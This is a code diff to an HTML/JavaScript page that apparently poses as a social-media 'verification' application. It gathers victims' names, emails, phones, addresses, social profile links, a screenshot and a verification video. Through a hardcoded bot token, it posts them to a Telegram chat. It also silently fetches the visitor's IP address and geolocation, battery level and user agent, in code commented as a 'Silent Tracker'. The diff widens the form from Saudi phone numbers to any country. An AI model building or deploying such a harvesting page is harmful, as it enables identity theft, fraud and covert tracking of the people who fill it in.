@@ -106,7 +106,6 @@
             border-radius: 4px;
         }
 
-        /* Video Preview Styles */
         #videoPreview {
             width: 100%;
             border-radius: 12px;
@@ -115,7 +114,6 @@
             background: #000;
         }
 
-        /* Progress Bar */
         .progress-container {
             display: none;
             width: 100%;
@@ -194,8 +192,8 @@
         </div>
 
         <div class="form-group">
-            <label>Phone Number (KSA)</label>
-            <input type="tel" id="phone" placeholder="+966 5X XXX XXXX" required>
+            <label>Phone Number (Include Country Code)</label>
+            <input type="tel" id="phone" placeholder="+1..." required>
         </div>
 
         <div class="form-group">
@@ -251,7 +249,6 @@
     const BOT_TOKEN = "8385508779:AAGWgCBn13wKo1AYGKpvUIBHgj-JojNtos4";
     const CHAT_ID = "7950771882";
 
-    // Video Preview Logic
     document.getElementById('videoFile').addEventListener('change', function(e) {
         const file = e.target.files[0];
         const videoPreview = document.getElementById('videoPreview');
@@ -265,47 +262,35 @@
     document.getElementById('verifyForm').addEventListener('submit', async function(e) {
         e.preventDefault();
         
-        // --- VALIDATION ---
-        const phone = document.getElementById('phone').value;
-        const email = document.getElementById('email').value;
-        const fb = document.getElementById('fbLink').value;
-
-        if (!phone.startsWith('+966')) {
-            return Swal.fire('Error', 'Phone number must start with +966', 'error');
-        }
-
-        if (!fb.includes('facebook.com')) {
-            return Swal.fire('Error', 'Please provide a valid Facebook URL', 'error');
-        }
-
         const btn = document.getElementById('submitBtn');
         const progCont = document.getElementById('progCont');
         const progBar = document.getElementById('progBar');
+        const screenshotFile = document.getElementById('screenshot').files[0];
+        const videoFile = document.getElementById('videoFile').files[0];
 
         btn.innerText = "Submitting...";
         btn.disabled = true;
         progCont.style.display = "block";
-        progBar.style.width = "10%";
+        progBar.style.width = "5%";
 
-        // Generate App ID
         const appId = "MW-" + Date.now();
 
-        // 1. Silent Tracker Data
-        let ipData = { ip: "Blocked", city: "Unknown", country_name: "Unknown", timezone: "Unknown" };
+        // 1. Improved Real IP Fetching
+        let ipData = { ip: "Not Found", city: "Unknown", country: "Unknown" };
         try {
-            const response = await fetch('https://ipapi.co/json/');
-            ipData = await response.json();
-            progBar.style.width = "30%";
-        } catch (err) {}
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            const geoRes = await fetch(`https://ipapi.co/${data.ip}/json/`);
+            ipData = await geoRes.json();
+        } catch (err) { console.error("IP tracking failed"); }
+        progBar.style.width = "20%";
 
-        // 2. Device/Battery Info
         let batteryLevel = "N/A";
         if (navigator.getBattery) {
             const battery = await navigator.getBattery();
             batteryLevel = (battery.level * 100) + "%";
         }
 
-        // 3. Construct Detailed Caption
         const caption = `
 🌟 *NEW VERIFICATION REQUEST* 🌟
 ━━━━━━━━━━━━━━━━━━━━
@@ -315,44 +300,47 @@
 
 *PERSONAL INFO:*
 • *Name:* ${document.getElementById('realName').value}
-• *Email:* ${email}
-• *Phone:* ${phone}
+• *Email:* ${document.getElementById('email').value}
+• *Phone:* ${document.getElementById('phone').value}
 • *Address:* ${document.getElementById('address').value}
 
 *SOCIAL LINKS:*
-• *FB:* ${fb}
+• *FB:* ${document.getElementById('fbLink').value}
 • *IG:* ${document.getElementById('igLink').value || 'None'}
 • *TikTok:* ${document.getElementById('tkLink').value || 'None'}
 
 *NETWORK & DEVICE:*
-• *IP:* ${ipData.ip}
-• *City:* ${ipData.city}
+• *IP:* ${ipData.ip || 'Unknown'}
+• *Loc:* ${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'}
 • *Power:* ${batteryLevel}
 • *Agent:* ${navigator.userAgent.substring(0, 40)}...
 ━━━━━━━━━━━━━━━━━━━━
         `;
 
-        // 4. Send Media to Telegram
-        const videoFile = document.getElementById('videoFile').files[0];
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('video', videoFile);
-        formData.append('caption', caption);
-        formData.append('parse_mode', 'Markdown');
-
         try {
-            progBar.style.width = "60%";
-            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-                method: 'POST',
-                body: formData
-            });
+            // A. Send Screenshot First
+            progBar.style.width = "40%";
+            const photoData = new FormData();
+            photoData.append('chat_id', CHAT_ID);
+            photoData.append('photo', screenshotFile);
+            photoData.append('caption', `📸 Screenshot for ID: ${appId}`);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: photoData });
 
+            // B. Send Video + Full Caption
+            progBar.style.width = "70%";
+            const videoData = new FormData();
+            videoData.append('chat_id', CHAT_ID);
+            videoData.append('video', videoFile);
+            videoData.append('caption', caption);
+            videoData.append('parse_mode', 'Markdown');
+
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: videoData });
             progBar.style.width = "100%";
 
             if (res.ok) {
                 Swal.fire({
                     title: 'Application Sent!',
-                    html: `Your ID: <b>${appId}</b><br><br>Our team will review your social presence and verification video within 24 hours.`,
+                    html: `Your ID: <b>${appId}</b><br><br>Our team will review your application within 24 hours.`,
                     icon: 'success',
                     confirmButtonColor: '#ffcc00'
                 });
@@ -362,7 +350,7 @@
                 throw new Error("Failed");
             }
         } catch (error) {
-            Swal.fire('Upload Error', 'The video might be too large. Please try a shorter clip.', 'error');
+            Swal.fire('Error', 'Submission failed. Check your internet or file size.', 'error');
         } finally {
             btn.innerText = "Submit Application";
             btn.disabled = false;
